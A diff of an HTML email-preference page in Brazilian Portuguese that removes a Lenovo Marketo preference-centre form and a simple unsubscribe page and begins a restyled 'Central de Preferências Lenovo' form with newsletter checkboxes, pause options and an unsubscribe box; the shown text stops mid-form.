-                      <div class="mktoFormRow">
-                        <input type="hidden" name="Unsubscribed" class="mktoField mktoFieldDescriptor mktoFormCol" style="margin-bottom: 10px;" value="">
-                        <div class="mktoClear"></div>
-                      </div>
-                    </fieldset>
-                    <div class="mktoClear"></div>
-                  </div>
-                  <div class="mktoFormRow">
-                    <input type="hidden" name="Country" class="mktoField mktoFieldDescriptor mktoFormCol" value="BR" style="margin-bottom: 10px;">
-                    <div class="mktoClear"></div>
-                  </div>
-                  <div class="mktoFormRow">
-                    <input type="hidden" name="contactMeDate" class="mktoField mktoFieldDescriptor mktoFormCol" value="2026-01-07 09:27:08" style="margin-bottom: 10px;">
-                    <div class="mktoClear"></div>
-                  </div>
-                  <div class="mktoButtonRow"><span class="mktoButtonWrap mktoNative" style="margin-left: 11px;"><button type="submit" class="mktoButton">Enviar</button></span></div>
-                  <input type="hidden" name="formid" class="mktoField mktoFieldDescriptor" value="12498"><input type="hidden" name="lpId" class="mktoField mktoFieldDescriptor" value="17525"><input type="hidden" name="subId" class="mktoField mktoFieldDescriptor" value="109"><input type="hidden" name="munchkinId" class="mktoField mktoFieldDescriptor" value="183-WCT-620"><input type="hidden" name="lpurl" class="mktoField mktoFieldDescriptor" value="//pages.lenovo.com/descadastrar.html?cr={creative}&amp;kw={keyword}"><input type="hidden" name="cr" class="mktoField mktoFieldDescriptor" value=""><input type="hidden" name="kw" class="mktoField mktoFieldDescriptor" value=""><input type="hidden" name="q" class="mktoField mktoFieldDescriptor" value="">
-                </form>
-                <script>
-                  (function (){
-                    var formDescriptor = {"Id":12498,"Vid":12498,"Status":"approved","Name":"BR-Preference Centre.Form Brasil","Description":"","Layout":"left","GutterWidth":10,"OffsetWidth":10,"HasTwoButtons":true,"SubmitLabel":"Enviar","ResetLabel":"Clear","ButtonLocation":"11","LabelWidth":100,"FieldWidth":150,"ToolTipType":"none","FontFamily":"Helvetica, Arial, sans-serif","FontSize":"13px","FontColor":"#333","FontUrl":null,"LineMargin":10,"ProcessorVersion":2,"CreatedByUserid":null,"ProcessOptions":{"language":"Portuguese (Brazil)","locale":"pt_BR","profiling":{"isEnabled":false,"numberOfProfilingFields":3,"alwaysShowFields":[]},"socialSignOn":{"isEnabled":false,"enabledNetworks":[],"cfId":null,"codeSnippet":null},"knownLead":{"type":"form","template":""}},"EnableDeferredMode":0,"EnableCaptcha":0,"EnableGlobalFormValidationRule":1,"ButtonType":null,"ButtonImageUrl":null,"ButtonText":null,"ButtonSubmissionText":"Aguarde","ButtonStyle":{"id":14,"className":"mktoNative","css":"","buttonColor":null},"ThemeStyle":{"id":2,"displayOrder":1,"name":"Simple","backgroundColor":"#FFF","layout":"left","fontFamily":"Helvetica, Arial, sans-serif","fontSize":"13px","fontColor":"#333","offsetWidth":10,"gutterWidth":10,"labelWidth":100,"fieldWidth":150,"lineMargin":10,"useBackgroundColorOnPreview":false,"css":".mktoForm fieldset.mkt3-formEditorFieldContainer{border: solid 1px gray;}.mktoForm fieldset.mkt3-formEditorFieldContainer legend{padding:0 1em;}","href":"css\/forms2-theme-simple.css","buttonStyleId":11},"ThemeStyleOverride":"\/* Add your custom CSS below *\/\nform{\nfont-family: 'Lato', sans-serif!important;\n  font-size:15px!important;\n}\ninput{\n    border: 0px;\n    padding: 8px 8px!important;\n    border-radius: 0;\n}\nselect{\n    border: 0px;\n    padding: 8px 8px!important;\n    border-radius: 0;\n  color: #333;\n}\n#tab0 .mktoForm .mktoLabel{\nfloat:right!important;\n}\nlegend{\ndisplay:none;\n}\nbutton[type=\"submit\"]{\n    background-color: #3d8ddd;\n    color: #fff;\n    text-decoration: none;\n    margin-top: 20px;\n    padding: 15px;\n    display: inline-block;\n    text-transform: uppercase;\n    font-size: 12px;\n      box-shadow: none;\n    border: 0;\n  min-width:150px;\n}\n.mktoAsterix{\ndisplay:none!important;}\n\n\n\/* Custom inputs *\/\n.mktoCheckboxList label {\nfloat:none!important;\nline-height: 40px!important;\n  margin:0px;   \n  width:auto!important;\n}\n.mktoCheckboxList input {\n  margin: 13.5px 0px;\n}\n[title=\"Data Centre Offerings\"], [title=\"PCs & Workstations\"]{\nwidth:auto!important;\n}\n#tab1 .mktoCheckboxList{\nwidth:auto!important;\n}\n\n.mktoForm .mktoGutter{\nwidth:0px!important;\n}\n","LiveStreamSettings":null,"rows":[[{"Id":602636,"Name":"FieldSet_2018-05-08T15:15:02.969Z","Datatype":"fieldset","InputLabel":"","InputInitialValue":"","InputSourceChannel":"constant","ProfilingFieldNumber":0,"IsLabelToLeft":true}],[{"Id":602645,"Name":"FieldSet_2018-05-08T15:43:02.381Z","Datatype":"fieldset","InputLabel":"","InputInitialValue":"","InputSourceChannel":"constant","ProfilingFieldNumber":0,"IsLabelToLeft":true}],[{"Id":602640,"Name":"Country","Datatype":"hidden","Maxlength":255,"InputLabel":"","InputInitialValue":"BR","InputSourceChannel":"constant","InputSourceSelector":"","FieldWidth":382,"LabelWidth":0,"ProfilingFieldNumber":0}],[{"Id":602649,"Name":"contactMeDate","Datatype":"hidden","InputLabel":"Contact Me Date:","InputInitialValue":"2026-01-07 09:27:08","InputSourceChannel":"constant","InputSourceSelector":"","ProfilingFieldNumber":0,"DisablePrefill":true}]],"fieldsetRows":{"602636":[[{"Id":602638,"Name":"HtmlText_2018-05-09T10:39:32.040Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":260,"ProfilingFieldNumber":0,"Htmltext":"\u003Ch4 style=\"margin-bottom: 25px;\"\u003EMinhas prefer\u00eancias\u003C\/h4\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}],[{"Id":602639,"Name":"HtmlText_2018-05-09T10:40:55.021Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":700,"ProfilingFieldNumber":0,"Htmltext":"\u003Cdiv class=\"bodycontent\"\u003E\n\u003Cp style=\"font-size: 15px; margin-bottom: 15px;\"\u003E\u003Cstrong\u003ENosso sistema de comunica\u00e7\u00e3o \u00e9 ultra inteligente\u003C\/strong\u003E\u003C\/p\u003E\n\u003Cp\u003EVoc\u00ea n\u00e3o precisa ter acesso a todos os conte\u00fados. Mas tamb\u00e9m seria uma pena voc\u00ea perder algo muito importante que precisa saber. Queremos garantir que voc\u00ea receba o que \u00e9 importante, na medida certa! Sem lotarmos a caixa de entrada do seu e-mail!\u003C\/p\u003E\n\u003C\/div\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}],[{"Id":602637,"Name":"Email","IsRequired":true,"Datatype":"hidden","Maxlength":255,"InputLabel":"Digite seu e-mail","InputInitialValue":"","InputSourceChannel":"url","InputSourceSelector":"email","VisibleRows":0,"FieldWidth":385,"LabelWidth":0,"PlaceholderText":"E-mail","FieldsetFieldId":602636}],[{"Id":602641,"Name":"HtmlText_2018-05-08T15:30:40.582Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":260,"ProfilingFieldNumber":0,"Htmltext":"\u003Cp style=\"font-size: 15px; margin-top: 20px;\"\u003E\u003Cstrong\u003EEnviar informa\u00e7\u00f5es sobre \u003C\/strong\u003E\u003C\/p\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}],[{"Id":602648,"Name":"communicationPreferences","Datatype":"checkbox","Maxlength":255,"PicklistValues":[{"label":"Newsletter","value":"Newsletter"},{"label":"Eventos e Webinars","value":"Eventos e Webinars"},{"label":"Lan\u00e7amento de produtos","value":"Lan\u00e7amento de produtos"},{"label":"Promo\u00e7\u00f5es e Ofertas","value":"Promo\u00e7\u00f5es e Ofertas"},{"label":"Material Rico","value":"Material Rico"},{"label":"Artigo de Blog e Blogposts","value":"Artigo de Blog e Blogposts"}],"InputLabel":"","InputInitialValue":"","InputSourceChannel":"constant","FieldWidth":260,"LabelWidth":0,"ProfilingFieldNumber":0,"ValidationMessage":"Este campo \u00e9 obrigat\u00f3rio","FieldsetFieldId":602636}],[{"Id":602643,"Name":"HtmlText_2018-05-09T11:50:31.522Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":700,"ProfilingFieldNumber":0,"Htmltext":"\u003Cdiv style=\"border-bottom: 1px solid #d5d5d5; padding-bottom: 50px; margin-bottom: 30px;\"\u003E\u003Ca href=\"#\" style=\"background-color: #3d8ddd; color: #fff; text-decoration: none; margin-top: 20px; min-width: 200px; text-align: center; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;\" id=\"update-my-prefer\"\u003EATUALIZAR MINHAS PREFER\u00caNCIAS\u003C\/a\u003E\u003C\/div\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}],[{"Id":602642,"Name":"HtmlText_2018-05-08T15:39:40.254Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":700,"ProfilingFieldNumber":0,"Htmltext":"\u003Cp style=\"font-size: 15px;\"\u003E\u003Cstrong\u003EQuero fazer uma pausa nas comunica\u00e7\u00f5es \u003C\/strong\u003E\u003C\/p\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}],[{"Id":602650,"Name":"lastSourcePersonalization3","Datatype":"checkbox","Maxlength":255,"PicklistValues":[{"label":"Eu gostaria de fazer uma pausa de um m\u00eas","value":"1 Month Break"},{"label":"Eu gostaria de fazer uma pausa de tr\u00eas meses","value":"3 Month Break"},{"label":"Eu gostaria de fazer uma pausa de seis meses","value":"6 Month Break"},{"label":"Eu n\u00e3o gostaria de fazer uma pausa","value":"No Break"}],"InputLabel":"","InputInitialValue":"","InputSourceChannel":"constant","FieldWidth":673,"LabelWidth":0,"ProfilingFieldNumber":0,"ValidationMessage":"Este campo \u00e9 obrigat\u00f3rio","FieldsetFieldId":602636,"DisablePrefill":true}],[{"Id":602644,"Name":"HtmlText_2018-05-09T11:53:43.421Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":700,"ProfilingFieldNumber":0,"Htmltext":"\u003Cdiv style=\"border-bottom: 1px solid #d5d5d5; padding-bottom: 50px; margin-bottom: 30px;\"\u003E\u003Ca href=\"#\" style=\"background-color: #3d8ddd; color: #fff; text-decoration: none; margin-top: 20px; min-width: 200px; text-align: center; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;\" id=\"take-a-break\"\u003EDar um tempo\u003C\/a\u003E\u003C\/div\u003E","FieldsetFieldId":602636,"IsLabelToLeft":true}]],"602645":[[{"Id":602646,"Name":"HtmlText_2018-05-08T15:44:53.291Z","Datatype":"htmltext","Maxlength":0,"InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"LabelWidth":701,"ProfilingFieldNumber":0,"Htmltext":"\u003Cp id=\"unsubscribe-text\" style=\"font-size: 15px;\"\u003E\u003Cstrong\u003ECancelar a assinatura de todas as comunica\u00e7\u00f5es\u003C\/strong\u003E\u003C\/p\u003E\n\u003Cspan style=\"background-color: #68747e; cursor: pointer; color: #fff; text-decoration: none; margin-top: 20px; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;\" id=\"un-subscribe\"\u003ECancelar inscri\u00e7\u00e3o de tudo\u003C\/span\u003E","FieldsetFieldId":602645,"IsLabelToLeft":true}],[{"Id":602647,"Name":"Unsubscribed","Datatype":"hidden","Maxlength":0,"InputLabel":"Inscri\u00e7\u00e3o Cancelada","InputInitialValue":"","InputSourceChannel":"constant","InputSourceSelector":"constant","VisibleRows":0,"FieldWidth":28,"ProfilingFieldNumber":0,"FieldsetFieldId":602645}]]},"action":"\/index.php\/leadCapture\/save2","munchkinId":"183-WCT-620","dcJsUrl":"","invalidInputMsg":"Invalid Input","formSubmitFailedMsg":"Submission failed, please try again later.","isPreview":null};
-                    MktoForms2.setOptions({baseUrl:"/js/forms2/"});
-                    var isDev = false;
-                    if(isDev && window.console && window.JSON){
-                      console.log(JSON.stringify(formDescriptor, null, "  "));
-                    }
-                    formDescriptor.lpId = 17525;
-                    var form = MktoForms2.newForm(formDescriptor, function (form){
-                      var lpFields = {"lpId":17525,"subId":109,"munchkinId":"183-WCT-620","lpurl":"\/\/pages.lenovo.com\/descadastrar.html?cr={creative}&kw={keyword}"};
-                      var pageFields = MktoForms2.getPageFields();
-                      form.addHiddenFields(lpFields);
-                      form.addHiddenFields(pageFields);
-                      if(window.mktoPreFillFields){
-                        form.setValuesCoerced(mktoPreFillFields);
-                      }
-                      if(!form.EnableDeferredMode){
-                        form.render();
-                      }
-                    });     
-                  })()
-                </script>
-                <noscript>
-                  <form class='mktoForm mktoNoJS'>
-                    <input type="hidden" name="formid" value="12498" />
-                  </form>
-                  <p>Please enable Javascript to view this form.</p>
-                </noscript>
-              </span>
-            </div>
-          </div>
-        </div>
-        <!-- end FLUID Tab Containers -->
-      </div>
-      <!-- Second BANNER SECTION -->
-      <section class="business-header-second">
-        <div class="container">
-          <div class="business-partner">
-            <div class="business-main-text-second mktoText" id="secondbanner">
-              <div class="row">
-                <div class="col-md-7 col-sm-7 col-xs-12">
-                  <h1 id="mt-whythink" class="display-3 text-left text-white">Por que Think?</h1>
-                  <p>Desde 1992, projetamos nossos produtos com design proposital, inovação implacável e qualidade confiável.</p>
-                  <a href="https://www.lenovo.com/br/pt/think/" class="learn-more">Veja mais</a>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-      <!-- SECOND BANNER SECTION END  -->
-      <!-- Footer -->
-      <footer class="footer">
-        <div class="container-fluid">
-          <div class="socials mktoText" id="footerSocials">
-            <ul class="nav nav-pills">
-              <li role="presentation"><a href="https://www.facebook.com/lenovobr"><i class="fab fa-facebook-f"></i></a></li>
-              <li role="presentation"><a href="https://www.twitter.com/lenovobr/"><i class="fab fa-twitter"></i></a></li>
-              <li role="presentation"><a href="https://www.youtube.com/user/lenovobr"><i class="fab fa-youtube"></i></a></li>
-              <li role="presentation"><a href="https://www.linkedin.com/company/lenovobr"><i class="fab fa-linkedin-in"></i></a></li>
-            </ul>
-          </div>
-          <div class="clearfix"></div>
-          <div class="row">
-            <!-- Info Footer -->
-            <div class="copyrights mktoText" id="footercopyright">
-              <div class="col-md-12">
-                <p>© 2021 Lenovo. Todos os direitos reservados. <a href="https://www.lenovo.com/br/pt/privacy/">Privacidade</a><a href="https://www.lenovo.com/br/pt/legal/">Informações legais</a></p>
-              </div>
-              <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-              <script>// <![CDATA[
-                $( document ).ready(function() {
-                        setTimeout(() => {
-                            if ($('input[name="Email"').val() == ''){
-                                $('input[name="Email"').css("min-width","400px");
-                                $('input[name="Email"').attr('type', 'text');
-                                $('input[name="Email"').attr('placeholder', 'Digite seu e-mail');
-                                
-                            }
-                        }, "1000");
-                    });
-                // ]]>
-              </script>
-            </div>
-          </div>
-        </div>
-      </footer>
-      <!-- Bootstrap core JavaScript -->
-      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-      <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>
-      <script>
-        $( document ).ready(function() {
-        var hash = window.location.hash;
-                    hash && $('ul.nav-tabs a[href="' + hash + '"]').tab('show'); 
-                    $('ul.nav-tabs a').click(function (e) {
-                      history.pushState( null, null, $(this).attr('href') );
-                      e.preventDefault();
-                       $(this).tab('show');
-                       window.location.hash = this.hash;
-                    
-                    });
-         setTimeout(function () {
-              if (location.hash) {
-                  window.scrollTo(0, 0);
-              }
-          }, 1);
-          
-        /* When the form has loaded... */
-        MktoForms2.whenReady(function(form) {
-            //Insert Id for each tab
-        $(".mktoFormRow fieldset").each(function( i ) {
-          $( this ).parent(".mktoFormRow").addClass("tab").attr("id","tab" + i);
-        });
-            
-             if( $('input[name="Unsubscribed"]').val() == "true"){      
-             	  $('#un-subscribe').text('Inscrever em todos');
-             	  $("#unsubscribe-text strong").text('É anulado todas as assinaturas');              
-             } else if( $('input[name="Unsubscribed"]').val() == "false" || $('input[name="Unsubscribed"]').val() == ""){
-                $('#un-subscribe').text('Cancelar inscrição de tudo');
-             	  $("#unsubscribe-text strong").text('Cancelar a assinatura de todas as comunicações');    
-             }  
-            
-        if("" != "") {
-        	$('[name="businessGroupLast"][value="dcg"]').prop('checked','true');
-        }
-        if("" != "") {
-        	$('[name="businessGroupLast"][value="idg"]').prop('checked','true');
-        }
-        if("" != "") {
-        	$('[name="businessGroupLast"][value="mbg"]').prop('checked','true');
-        }
-        if("" != "") {
-        	$('[name="businessGroupLast"][value="ssg"]').prop('checked','true');
-        }        
-            
-            //Checkbox label change 
-            var checkClass = $('[name="communicationPreferences"]').not(document.getElementById("select-all-options")).addClass("single-check");
-            var checkClass2 = $('[name="productInterest"]').not(document.getElementById("select-all-options2")).addClass("single-check2");     
-            
-            $('#select-all-options').change(function () {
-              $('#tab1 .single-check').prop('checked',this.checked);        
-              if($('#tab1 .single-check').prop('checked') == false){         
-                $('label[for="select-all-options"]').text('Selecionar tudo');        
-              }else if($('#tab1 .single-check').prop('checked') == true){
-                $('label[for="select-all-options"]').text("Desmarcar tudo");       
-              }
-            });
-            
-            $('#select-all-options2').change(function () {
-              $('#tab1 .single-check2').prop('checked',this.checked);        
-              if($('#tab1 .single-check2').prop('checked') == false){         
-                $('label[for="select-all-options2"]').text('Selecionar tudo');        
-              }else if($('#tab1 .single-check2').prop('checked') == true){
-                $('label[for="select-all-options2"]').text("Desmarcar tudo");       
-              }
-            });    
-        
-            $('#tab1 .single-check').change(function () {
-             if ($('#tab1 .single-check:checked').length == $('#tab1 .single-check').length){
-              $('#select-all-options').prop('checked',true);
-               $('label[for="select-all-options"]').text("Desmarcar tudo");
-             }
-             else {
-              $('#select-all-options').prop('checked',false);
-               $('label[for="select-all-options"]').text("Selecionar tudo");
-        
-             }
-            });
-        
-        
-            $('#tab1 .single-check2').change(function () {   
-             if ($('#tab1 .single-check2:checked').length == $('#tab1 .single-check2').length){
-              $('#select-all-options2').prop('checked',true);
-               $('label[for="select-all-options2"]').text("Desmarcar tudo");
-             }
-             else {
-              $('#select-all-options2').prop('checked',false);
-               $('label[for="select-all-options2"]').text("Selecionar tudo");
-        
-             }
-            });
-            
-            //end checkbox label change
-             //Hide and Show Tabs accordingly
-          	
-            
-            
-        if(window.location.hash == "#myprofile"){
-           $("#tab1").hide();
-          	$("#tab2").hide();
-              $("#tab0").show();
-              $("button[type='submit']").show();
-          }else if(window.location.hash == "#mypreferences"){
-           $("#tab0").hide();
-              $("#tab1").show();
-          	$("#tab2").show();
-              $("button[type='submit']").hide();
-          }else{
-            $("#tab1").hide();
-            $("#tab2").hide();
-          }
-        
-           
-            
-            $("#my-preferences").click(function(){
-        $("#tab0").hide();
-              $("#tab1").show();
-          	$("#tab2").show();
-              $("button[type='submit']").hide();
-        });
-            $("#my-profile").click(function(){
-        $("#tab1").hide();
-          	$("#tab2").hide();
-              $("#tab0").show();
-              $("button[type='submit']").show();
-            })
-            
-            //Non Form Button Submit
-            $("#update-my-prefer").click(function(e){
-                // When the button is clicked, get the form object and submit it
-               form.submit();
-               e.preventDefault();             
-            });
-            
-            
-           
-            
-        // Find the button element that you want to attach the event to
-          var btnUpdatePref = document.getElementById("update-my-prefer");
-          var btnBreak = document.getElementById("take-a-break");
-             var btnUnsubscribe = document.getElementById("un-subscribe");
-          btnUpdatePref.onclick = function(e) {
-              // When the button is clicked, get the form object and submit it
-            //Check if it is there isoption selected from the SELECT ALL
-            
-            if($("#tab1 .single-check:checked").length > 0){
-               $('input[name="Unsubscribed"]').attr("value", false);
-            }
-            
-             form.submit();
-             e.preventDefault();      
-          };
-            btnBreak.onclick = function(e) {
-              // When the button is clicked, get the form object and submit it
-              form.submit();
-              e.preventDefault();   
-          };
-            
-            
-            //Unsubscribe button
-            
-           btnUnsubscribe.onclick = function(e) {
-        
-             if( $('input[name="Unsubscribed"]').val() == "true"){      
-                $('input[name="Unsubscribed"]').attr("value", "false");
-                $('#un-subscribe').text('Cancelar inscrição de tudo');
-             	  $("#unsubscribe-text strong").text('Cancelar a assinatura de todas as comunicações');         
-             } else if( $('input[name="Unsubscribed"]').val() == "false" || $('input[name="Unsubscribed"]').val() == "") {
-             	  $('input[name="Unsubscribed"]').attr("value", "true");
-             	  $('#un-subscribe').text('Inscrever em todos');
-             	  $("#unsubscribe-text strong").text('É anulado todas as assinaturas');
-             }
-             
-        
-            
-            
-             
-              // When the button is clicked, get the form object and submit it
-             
-              form.submit();
-             
-              e.preventDefault();   
-          };
-        
-            
-         
-          });
-          
-          
-          
-        });
-      </script>
-      <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            document.querySelector("link[rel='shortcut icon']").href = 'https://pages.lenovo.com/rs/183-WCT-620/images/ek-favicon.png';
-            document.querySelector("link[rel='icon']").href = 'https://pages.lenovo.com/rs/183-WCT-620/images/ek-favicon.png'; 
-        });
-      </script>    
-    </div>
-    <div id="mktoStyleLoaded" style="display: none; border-top-color: rgb(18, 52, 86);"></div>
-    <script type="text/javascript" src="//munchkin.marketo.net//munchkin.js"></script><script>Munchkin.init('183-WCT-620', {customName: 'descadastrar', wsInfo: 'j0hRdtjP'});</script><script type="text/javascript" src="/js/stripmkttok.js"></script>
-    <form class="mktoForm mktoHasWidth mktoLayoutLeft" novalidate="novalidate" style="font-family: Helvetica, Arial, sans-serif; font-size: 13px; color: rgb(51, 51, 51); visibility: hidden; position: absolute; top: -500px; left: -1000px; width: 896px;"></form>
-  </body>
-</html> -->
-
-<!--  -->
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="robots" content="noindex">
-<title>Descadastrar</title>
-
-<style>
-body {
-  background: #0f2027;
-  color: #fff;
-  font-family: Arial, sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-.box {
-  background: rgba(0,0,0,.8);
-  padding: 40px;
-  border-radius: 12px;
-  width: 380px;
-}
-label {
-  display: block;
-  margin-top: 15px;
-}
-input, select, button {
-  width: 100%;
-  padding: 10px;
-  margin-top: 5px;
-}
-button {
-  margin-top: 20px;
-  background: #00e5ff;
-  border: none;
-  font-weight: bold;
-  cursor: pointer;
-}
-.success {
-  text-align: center;
-}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Central de Preferências Lenovo</title>
+    <link rel="shortcut icon" href="https://www3.lenovo.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:100,300,400,Montserrat:400,700" rel="stylesheet">
+    
+    <style>
+        body {
+            font-family: 'Lato', sans-serif;
+            font-size: 15px;
+            color: #1e0013;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 830px;
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .header {
+            background: linear-gradient(135deg, #7A126B 0%, #294e95 100%);
+            color: white;
+            padding: 80px 20px;
+            text-align: center;
+        }
+        .header h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 48px;
+            margin: 0 0 20px 0;
+            font-weight: 300;
+        }
+        .header p {
+            font-size: 20px;
+            opacity: 0.9;
+        }
+        .content {
+            padding: 60px 20px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+            font-size: 16px;
+        }
+        .form-group input[type="email"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input[type="email"]:focus {
+            outline: none;
+            border-color: #7A126B;
+        }
+        .checkbox-group {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+        .checkbox-item {
+            margin-bottom: 15px;
+        }
+        .checkbox-item input[type="checkbox"],
+        .checkbox-item input[type="radio"] {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .checkbox-item label {
+            font-weight: 400;
+            cursor: pointer;
+            margin: 0;
+            font-size: 15px;
+        }
+        .btn-submit {
+            background: #7A126B;
+            color: white;
+            padding: 18px 60px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover {
+            background: #4D144A;
+        }
+        .btn-submit:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .success-page {
+            display: none;
+            text-align: center;
+            padding: 100px 20px;
+        }
+        .success-page.active {
+            display: block;
+        }
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: #28a745;
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            color: white;
+        }
+        .success-page h2 {
+            font-size: 36px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        .success-page p {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .form-page.hidden {
+            display: none;
+        }
+        .footer {
+            background: #e6e2e4;
+            padding: 40px 20px;
+            text-align: center;
+            color: #373737;
+        }
+        .footer p {
+            margin: 10px 0;
+            font-size: 13px;
+        }
+        .footer a {
+            color: #373737;
+            text-decoration: underline;
+            margin: 0 10px;
+        }
+        .tracking-info {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 32px;
+            }
+            .header p {
+                font-size: 16px;
+            }
+            .btn-submit {
+                width: 100%;
+                padding: 15px;
+            }
+        }
+    </style>
 </head>
-
 <body>
+    <div class="form-page" id="formPage">
+        <div class="header">
+            <div class="container">
+                <h1>Central de Preferências</h1>
+                <p>Personalize suas comunicações com a Lenovo</p>
+            </div>
+        </div>
 
-<div class="box" id="formBox">
-  <h2>Descadastrar e-mail</h2>
+        <div class="content">
+            <div class="container">
+                <!-- Informação do Tracking -->
+                <div class="tracking-info" id="trackingInfo" style="display:none;">
+                    <strong>📧 Identificamos seu email:</strong> <span id="emailFromTracking"></span>
+                </div>
 
-  <label>E-mail</label>
-  <input type="email" id="email" required>
+                <form id="preferencesForm">
+                    <div class="form-group">
+                        <label for="email">E-mail *</label>
+                        <input type="email" id="email" name="email" required placeholder="seu@email.com">
+                    </div>
 
-  <label>Preferência</label>
-  <select id="preference">
-    <option value="nao_receber">Não quero mais receber e-mails</option>
-    <option value="frequencia">Muitos e-mails</option>
-    <option value="conteudo">Conteúdo irrelevante</option>
-    <option value="outro">Outro</option>
-  </select>
+                    <div class="form-group">
+                        <label>Quero receber informações sobre:</label>
+                        <div class="checkbox-group">
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="newsletter" name="comunicacao" value="Newsletter">
+                                <label for="newsletter">Newsletter</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="eventos" name="comunicacao" value="Eventos e Webinars">
+                                <label for="eventos">Eventos e Webinars</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="lancamentos" name="comunicacao" value="Lançamento de produtos">
+                                <label for="lancamentos">Lançamento de produtos</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="promocoes" name="comunicacao" value="Promoções e Ofertas">
+                                <label for="promocoes">Promoções e Ofertas</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="material" name="comunicacao" value="Material Rico">
+                                <label for="material">Material Rico</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="checkbox" id="blog" name="comunicacao" value="Artigo de Blog e Blogposts">
+                                <label for="blog">Artigo de Blog e Blogposts</label>
+                            </div>
+                        </div>
+                    </div>
 
-  <button onclick="confirmUnsubscribe()">Confirmar descadastro</button>
-</div>
+                    <div class="form-group">
+                        <label>Fazer uma pausa nas comunicações:</label>
+                        <div class="checkbox-group">
+                            <div class="checkbox-item">
+                                <input type="radio" id="pausa1" name="pausa" value="1 mês">
+                                <label for="pausa1">Pausa de 1 mês</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="radio" id="pausa3" name="pausa" value="3 meses">
+                                <label for="pausa3">Pausa de 3 meses</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="radio" id="pausa6" name="pausa" value="6 meses">
+                                <label for="pausa6">Pausa de 6 meses</label>
+                            </div>
+                            <div class="checkbox-item">
+                                <input type="radio" id="semPausa" name="pausa" value="Sem pausa" checked>
+                                <label for="semPausa">Não fazer pausa</label>
+                            </div>
+                        </div>
+                    </div>
 
-<script>
-async function confirmUnsubscribe() {
+                    <div class="form-group">
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="unsubscribe" name="unsubscribe">
+                            <label for="unsubscribe" style="color: #dc3545; font-weight: 600;">
+                                Cancelar TODAS as comunicações
